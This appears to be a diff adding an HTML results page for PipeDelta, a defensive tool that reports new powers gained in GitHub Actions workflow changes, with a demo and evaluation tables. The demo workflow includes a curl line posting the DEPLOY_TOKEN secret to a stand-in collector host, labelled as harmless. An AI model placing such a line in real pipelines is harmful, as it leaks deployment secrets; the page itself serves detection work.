@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PipeDelta</title>
+<style>
+:root{
+  color-scheme:light;
+  --page:#f3f5f8; --surface:#fcfcfb; --ink:#0b0b0b; --ink2:#52514e; --line:#d9dde3;
+  --add:#e3f1e6; --add-ink:#14532d; --code:#f0f2f5;
+  --seg-none:#86b6ef; --seg-low:#3987e5; --seg-medium:#1c5cab; --seg-high:#0d366b;
+  --ok:#14532d; --miss:#8a2c0d; --na:#52514e;
+}
+@media (prefers-color-scheme:dark){
+  :root{
+    color-scheme:dark;
+    --page:#111214; --surface:#1a1a19; --ink:#f0efec; --ink2:#c3c2b7; --line:#34363a;
+    --add:#17301f; --add-ink:#b7e4c2; --code:#232527;
+    --seg-none:#184f95; --seg-low:#2a78d6; --seg-medium:#6da7ec; --seg-high:#b7d3f6;
+    --ok:#8fd3a3; --miss:#f0a488; --na:#c3c2b7;
+  }
+}
+*{box-sizing:border-box}
+body{margin:0;background:var(--page);color:var(--ink);font:16px/1.55 "Segoe UI",system-ui,-apple-system,Roboto,sans-serif}
+main{max-width:1040px;margin:0 auto;padding:40px 20px 80px}
+h1{font-size:2.6rem;line-height:1.1;margin:0 0 10px;letter-spacing:-.02em}
+h2{font-size:1.45rem;margin:56px 0 6px;letter-spacing:-.01em}
+p{margin:8px 0;max-width:70ch}
+.lede{font-size:1.2rem;color:var(--ink2)}
+.muted{color:var(--ink2)}
+code,pre{font-family:ui-monospace,"Cascadia Mono",Consolas,monospace;font-size:.86rem}
+.demo{display:grid;grid-template-columns:minmax(0,5fr) minmax(0,6fr);gap:0;margin-top:28px;background:var(--surface);border:1px solid var(--line);border-radius:10px;overflow:hidden}
+.demo>div{padding:18px 20px;min-width:0}
+.demo>div+div{border-left:1px solid var(--line)}
+.demo h3{font-size:.95rem;margin:0 0 10px;color:var(--ink2);font-weight:600}
+pre{margin:0;overflow-x:auto;line-height:1.5}
+pre span{display:block;white-space:pre;padding-right:8px}
+pre i{display:inline-block;width:1.4em;font-style:normal;color:var(--ink2)}
+pre .add{background:var(--add);color:var(--add-ink)}
+ul.find{list-style:none;margin:0;padding:0}
+ul.find li{display:grid;grid-template-columns:4.6em 1fr;gap:10px;padding:8px 0;border-top:1px solid var(--line)}
+ul.find li:first-child{border-top:0}
+.lv{font-size:.8rem;font-weight:700;text-align:center;border:1.5px solid currentColor;border-radius:4px;height:1.7em;line-height:1.5em}
+.lv-high{background:var(--ink);color:var(--surface);border-color:var(--ink)}
+.lv-medium{color:var(--ink)}
+.lv-low{color:var(--ink2);font-weight:500}
+.tiles{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:14px;margin-top:18px}
+.tile{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:16px 18px}
+.tile b{display:block;font-size:2rem;line-height:1.15;letter-spacing:-.02em}
+.tile span{color:var(--ink2);font-size:.92rem}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:18px 20px;margin-top:16px;overflow-x:auto}
+table{border-collapse:collapse;width:100%;font-size:.93rem}
+th,td{text-align:left;padding:7px 10px;border-top:1px solid var(--line);vertical-align:top}
+thead th{border-top:0;color:var(--ink2);font-weight:600}
+td:not(:first-child):not(:nth-child(2)),th:not(:first-child):not(:nth-child(2)){white-space:nowrap}
+.st{font-weight:600}.st-ok{color:var(--ok)}.st-miss{color:var(--miss)}.st-na{color:var(--na);font-weight:400}
+tr.total td{font-weight:700}
+.num td:not(:first-child),.num th:not(:first-child){text-align:right}
+.row{display:grid;grid-template-columns:130px 1fr;gap:12px;align-items:center;margin:9px 0}
+.name{font-weight:600;font-size:.95rem}.name small{display:block;font-weight:400;color:var(--ink2);font-size:.78rem}
+.bar{display:flex;gap:2px;height:26px}
+.seg{min-width:3px;border-radius:0;color:#fff;font-size:.75rem;font-weight:600;display:flex;align-items:center;justify-content:center;cursor:default;outline-offset:2px}
+.bar .seg:first-child{border-radius:4px 0 0 4px}.bar .seg:last-child{border-radius:0 4px 4px 0}
+.seg-none{background:var(--seg-none);color:#0b0b0b}.seg-low{background:var(--seg-low)}.seg-medium{background:var(--seg-medium)}.seg-high{background:var(--seg-high)}
+@media (prefers-color-scheme:dark){.seg-none,.seg-low{color:#fff}.seg-medium,.seg-high{color:#0b0b0b}}
+.legend{display:flex;flex-wrap:wrap;gap:6px 18px;font-size:.86rem;color:var(--ink2);margin:4px 0 14px}
+.legend i{display:inline-block;width:12px;height:12px;border-radius:3px;margin-right:6px;vertical-align:-1px}
+#tip{position:fixed;pointer-events:none;background:var(--ink);color:var(--surface);padding:6px 10px;border-radius:6px;font-size:.84rem;display:none;z-index:5;max-width:280px}
+details{margin-top:12px}summary{cursor:pointer;color:var(--ink2);font-size:.92rem}
+ul.plain{max-width:70ch;padding-left:1.2em}
+ul.plain li{margin:6px 0}
+footer{margin-top:56px;color:var(--ink2);font-size:.88rem}
+@media (max-width:760px){
+  h1{font-size:2rem}.demo{grid-template-columns:1fr}.demo>div+div{border-left:0;border-top:1px solid var(--line)}
+  .tiles{grid-template-columns:1fr}.row{grid-template-columns:1fr;gap:4px}
+}
+</style>
+</head>
+<body>
+<main>
+<h1>PipeDelta</h1>
+<p class="lede">When someone changes a project's GitHub Actions pipeline, PipeDelta tells the reviewer what new powers the pipeline just gained, in plain sentences.</p>
+
+<div class="demo">
+  <div>
+    <h3>A pipeline change (green lines are new)</h3>
+<pre><span class="same"><i> </i>name: CI</span><span class="add"><i>+</i>on: [push, pull_request, pull_request_target]</span><span class="same"><i> </i>permissions:</span><span class="add"><i>+</i>  contents: write</span><span class="same"><i> </i>jobs:</span><span class="same"><i> </i>  test:</span><span class="same"><i> </i>    runs-on: ubuntu-latest</span><span class="same"><i> </i>    steps:</span><span class="same"><i> </i>      - uses: actions/checkout@v4</span><span class="add"><i>+</i>      - uses: some-stranger/format-helper@v1</span><span class="same"><i> </i>      - run: python -m pytest</span><span class="add"><i>+</i>      - run: curl -s -d &quot;$TOKEN&quot; https://collector.example.invalid/upload</span><span class="add"><i>+</i>        env:</span><span class="add"><i>+</i>          TOKEN: ${{ secrets.DEPLOY_TOKEN }}</span></pre>
+  </div>
+  <div>
+    <h3>What PipeDelta reports: 5 new powers</h3>
+    <ul class="find">
+<li><b class="lv lv-high">high</b><span>In job &#x27;test&#x27;, now runs outside code some-stranger/format-helper@v1, and its author can change what that version does at any time.</span></li>
+<li><b class="lv lv-high">high</b><span>In job &#x27;test&#x27;, a command now contacts collector.example.invalid. The same job can read secrets, so they could be sent there.</span></li>
+<li><b class="lv lv-high">high</b><span>In the whole workflow, the pipeline token can now change: contents: write.</span></li>
+<li><b class="lv lv-high">high</b><span>In job &#x27;test&#x27;, can now read the secret DEPLOY_TOKEN.</span></li>
+<li><b class="lv lv-high">high</b><span>Now runs on &#x27;pull_request_target&#x27;, which people outside the project can set off while the pipeline still has access to secrets.</span></li>
+    </ul>
+  </div>
+</div>
+<p class="muted">This example is a harmless imitation. The action and the address in it do not exist. The report on the right is the tool's real output for the change on the left.</p>
+
+<h2>How well does it work?</h2>
+<p>Two separate tests. Version 0.2 was written after looking at the version 0.1 results, so its attack score is not independent evidence.</p>
+<div class="tiles">
+  <div class="tile"><b>6 of 10</b><span>attack cases blocked by the first version, written before any testing</span></div>
+  <div class="tile"><b>8 of 10</b><span>blocked by version 0.2, after two rules were added for the misses</span></div>
+  <div class="tile"><b>9.9%</b><span>of 1659 real past pipeline changes would have been blocked (23.1% in the first version)</span></div>
+</div>
+
+<h2>Test 1: reconstructed attack cases</h2>
+<p>12 cases written for this project from public reports of real attacks, with placeholder addresses. They are not the original malicious files. In two of them nothing changes in the victim's workflow file, so no tool of this kind can see them.</p>
+<div class="card">
+<table>
+<thead><tr><th>#</th><th>Case</th><th>Version 0.1</th><th>Version 0.2</th></tr></thead>
+<tbody>
+<tr><td>01</td><td>New workflow posts a named secret to an outside address (GhostAction 2025 shape)</td><td class="st st-ok">blocked</td><td class="st st-ok">blocked</td></tr>
+<tr><td>02</td><td>New workflow sends named secrets over plain HTTP (GhostAction 2026 shape)</td><td class="st st-ok">blocked</td><td class="st st-ok">blocked</td></tr>
+<tr><td>03</td><td>New workflow decodes and runs a hidden script (Megalodon 2026 shape)</td><td class="st st-miss">missed (low)</td><td class="st st-ok">blocked</td></tr>
+<tr><td>04</td><td>Existing workflow changed to send every secret at once</td><td class="st st-miss">missed (medium)</td><td class="st st-ok">blocked</td></tr>
+<tr><td>05</td><td>Workflow gains pull_request_target and checks out the visitor&#x27;s code (the setup later abused by &#x27;pwn request&#x27; attacks)</td><td class="st st-ok">blocked</td><td class="st st-ok">blocked</td></tr>
+<tr><td>06</td><td>Attack on an already risky pull_request_target workflow</td><td class="st st-na">cannot see</td><td class="st st-na">cannot see</td></tr>
+<tr><td>07</td><td>Workflow starts using an outside action by a movable version tag (the setup behind the tj-actions and trivy-action incidents)</td><td class="st st-ok">blocked</td><td class="st st-ok">blocked</td></tr>
+<tr><td>08</td><td>Version tag of an already used outside action is moved to malicious code</td><td class="st st-na">cannot see</td><td class="st st-na">cannot see</td></tr>
+<tr><td>09</td><td>Workflow pastes a pull request title into a shell command</td><td class="st st-ok">blocked</td><td class="st st-ok">blocked</td></tr>
+<tr><td>10</td><td>Secret sent to an address that is not written in the file</td><td class="st st-miss">missed (medium)</td><td class="st st-miss">missed (medium)</td></tr>
+<tr><td>11</td><td>Workflow uploads the whole checkout, including the stored token, as a public artifact (ArtiPACKED shape)</td><td class="st st-miss">missed (low)</td><td class="st st-miss">missed (low)</td></tr>
+<tr><td>12</td><td>Workflow token widened to write-all</td><td class="st st-ok">blocked</td><td class="st st-ok">blocked</td></tr>
+</tbody>
+</table>
+</div>
+
+<h2>Test 2: real pipeline history of eight projects</h2>
+<p>Every past commit that changed a workflow file in eight well-known Python projects, replayed through PipeDelta 0.2.0. Each bar shows how those commits were rated. Only git history was read.</p>
+<div class="card">
+  <div class="legend"><span><i class="seg-none"></i>No new power</span><span><i class="seg-low"></i>Low</span><span><i class="seg-medium"></i>Medium</span><span><i class="seg-high"></i>High (blocked)</span></div>
+<div class="row"><div class="name">flask<small>99 commits</small></div><div class="bar"><div class="seg seg-none" style="flex:42 1 0" tabindex="0" data-tip="flask: No new power, 42 of 99 commits (42.4%)">42%</div><div class="seg seg-low" style="flex:50 1 0" tabindex="0" data-tip="flask: Low, 50 of 99 commits (50.5%)">51%</div><div class="seg seg-medium" style="flex:2 1 0" tabindex="0" data-tip="flask: Medium, 2 of 99 commits (2.0%)"></div><div class="seg seg-high" style="flex:5 1 0" tabindex="0" data-tip="flask: High (blocked), 5 of 99 commits (5.1%)"></div></div></div>
+<div class="row"><div class="name">requests<small>107 commits</small></div><div class="bar"><div class="seg seg-none" style="flex:38 1 0" tabindex="0" data-tip="requests: No new power, 38 of 107 commits (35.5%)">36%</div><div class="seg seg-low" style="flex:62 1 0" tabindex="0" data-tip="requests: Low, 62 of 107 commits (57.9%)">58%</div><div class="seg seg-high" style="flex:7 1 0" tabindex="0" data-tip="requests: High (blocked), 7 of 107 commits (6.5%)"></div></div></div>
+<div class="row"><div class="name">httpx<small>28 commits</small></div><div class="bar"><div class="seg seg-none" style="flex:18 1 0" tabindex="0" data-tip="httpx: No new power, 18 of 28 commits (64.3%)">64%</div><div class="seg seg-low" style="flex:9 1 0" tabindex="0" data-tip="httpx: Low, 9 of 28 commits (32.1%)">32%</div><div class="seg seg-medium" style="flex:1 1 0" tabindex="0" data-tip="httpx: Medium, 1 of 28 commits (3.6%)"></div></div></div>
+<div class="row"><div class="name">rich<small>123 commits</small></div><div class="bar"><div class="seg seg-none" style="flex:88 1 0" tabindex="0" data-tip="rich: No new power, 88 of 123 commits (71.5%)">72%</div><div class="seg seg-low" style="flex:22 1 0" tabindex="0" data-tip="rich: Low, 22 of 123 commits (17.9%)">18%</div><div class="seg seg-medium" style="flex:3 1 0" tabindex="0" data-tip="rich: Medium, 3 of 123 commits (2.4%)"></div><div class="seg seg-high" style="flex:10 1 0" tabindex="0" data-tip="rich: High (blocked), 10 of 123 commits (8.1%)"></div></div></div>
+<div class="row"><div class="name">black<small>275 commits</small></div><div class="bar"><div class="seg seg-none" style="flex:93 1 0" tabindex="0" data-tip="black: No new power, 93 of 275 commits (33.8%)">34%</div><div class="seg seg-low" style="flex:163 1 0" tabindex="0" data-tip="black: Low, 163 of 275 commits (59.3%)">59%</div><div class="seg seg-medium" style="flex:2 1 0" tabindex="0" data-tip="black: Medium, 2 of 275 commits (0.7%)"></div><div class="seg seg-high" style="flex:17 1 0" tabindex="0" data-tip="black: High (blocked), 17 of 275 commits (6.2%)"></div></div></div>
+<div class="row"><div class="name">pydantic<small>421 commits</small></div><div class="bar"><div class="seg seg-none" style="flex:220 1 0" tabindex="0" data-tip="pydantic: No new power, 220 of 421 commits (52.3%)">52%</div><div class="seg seg-low" style="flex:140 1 0" tabindex="0" data-tip="pydantic: Low, 140 of 421 commits (33.3%)">33%</div><div class="seg seg-medium" style="flex:16 1 0" tabindex="0" data-tip="pydantic: Medium, 16 of 421 commits (3.8%)"></div><div class="seg seg-high" style="flex:45 1 0" tabindex="0" data-tip="pydantic: High (blocked), 45 of 421 commits (10.7%)">11%</div></div></div>
+<div class="row"><div class="name">pytest<small>255 commits</small></div><div class="bar"><div class="seg seg-none" style="flex:96 1 0" tabindex="0" data-tip="pytest: No new power, 96 of 255 commits (37.6%)">38%</div><div class="seg seg-low" style="flex:136 1 0" tabindex="0" data-tip="pytest: Low, 136 of 255 commits (53.3%)">53%</div><div class="seg seg-medium" style="flex:6 1 0" tabindex="0" data-tip="pytest: Medium, 6 of 255 commits (2.4%)"></div><div class="seg seg-high" style="flex:17 1 0" tabindex="0" data-tip="pytest: High (blocked), 17 of 255 commits (6.7%)"></div></div></div>
+<div class="row"><div class="name">fastapi<small>351 commits</small></div><div class="bar"><div class="seg seg-none" style="flex:144 1 0" tabindex="0" data-tip="fastapi: No new power, 144 of 351 commits (41.0%)">41%</div><div class="seg seg-low" style="flex:124 1 0" tabindex="0" data-tip="fastapi: Low, 124 of 351 commits (35.3%)">35%</div><div class="seg seg-medium" style="flex:20 1 0" tabindex="0" data-tip="fastapi: Medium, 20 of 351 commits (5.7%)"></div><div class="seg seg-high" style="flex:63 1 0" tabindex="0" data-tip="fastapi: High (blocked), 63 of 351 commits (17.9%)">18%</div></div></div>
+  <details><summary>Show the numbers as a table</summary>
+  <table class="num"><thead><tr><th>Project</th><th>No new power</th><th>Low</th><th>Medium</th><th>High (blocked)</th></tr></thead>
+  <tbody>
+<tr><td>flask</td><td>42</td><td>50</td><td>2</td><td>5</td></tr>
+<tr><td>requests</td><td>38</td><td>62</td><td>0</td><td>7</td></tr>
+<tr><td>httpx</td><td>18</td><td>9</td><td>1</td><td>0</td></tr>
+<tr><td>rich</td><td>88</td><td>22</td><td>3</td><td>10</td></tr>
+<tr><td>black</td><td>93</td><td>163</td><td>2</td><td>17</td></tr>
+<tr><td>pydantic</td><td>220</td><td>140</td><td>16</td><td>45</td></tr>
+<tr><td>pytest</td><td>96</td><td>136</td><td>6</td><td>17</td></tr>
+<tr><td>fastapi</td><td>144</td><td>124</td><td>20</td><td>63</td></tr>
+<tr class="total"><td>Total</td><td>739</td><td>706</td><td>50</td><td>164</td></tr>
+  </tbody></table></details>
+</div>
+<p>These commits are not labelled, so 9.9% is a block rate, not a false-alarm rate. None of them is a known attack. About one in ten is too many for a strict gate on a busy project; today the tool fits best as an advisory comment.</p>
+<div class="card">
+<table class="num"><thead><tr><th>Why commits were blocked (high-level findings, version 0.2)</th><th>Findings</th></tr></thead>
+<tbody>
+<tr><td>outside action not locked to a commit</td><td>272</td></tr>
+<tr><td>write permission</td><td>103</td></tr>
+<tr><td>secret and new network address in the same job</td><td>14</td></tr>
+<tr><td>trigger pull_request_target</td><td>14</td></tr>
+<tr><td>trigger workflow_run</td><td>6</td></tr>
+<tr><td>injection</td><td>4</td></tr>
+<tr><td>trigger issue_comment</td><td>3</td></tr>
+</tbody></table>
+</div>
+
+<h2>What it cannot do</h2>
+<ul class="plain">
+<li>It reads workflow files only. It does not look inside the outside actions or scripts a workflow calls.</li>
+<li>It misses internet addresses that are built from variables.</li>
+<li>It cannot see attacks that change no workflow file, such as a moved version tag.</li>
+<li>A pull request that removes the PipeDelta check can switch it off unless the check is marked as required.</li>
+<li>It has not been compared against existing scanners on the same cases.</li>
+</ul>
+
+<footer>PipeDelta 0.2.0. Numbers on this page are generated from <code>evaluation/results/</code> by <code>evaluation/build_dashboard.py</code>. Method and limits: <code>docs/EVALUATION.md</code>.</footer>
+</main>
+<div id="tip" role="status"></div>
+<script>
+const tip=document.getElementById('tip');
+function show(e,el){tip.textContent=el.dataset.tip;tip.style.display='block';
+  const r=el.getBoundingClientRect();const x=e.clientX||r.left+r.width/2,y=e.clientY||r.top;
+  tip.style.left=Math.min(x+12,innerWidth-tip.offsetWidth-8)+'px';tip.style.top=Math.max(8,y-tip.offsetHeight-10)+'px';}
+document.querySelectorAll('.seg').forEach(el=>{
+  el.addEventListener('mousemove',e=>show(e,el));
+  el.addEventListener('focus',e=>show(e,el));
+  el.addEventListener('mouseleave',()=>tip.style.display='none');
+  el.addEventListener('blur',()=>tip.style.display='none');
+});
+</script>
+</body>
+</html>
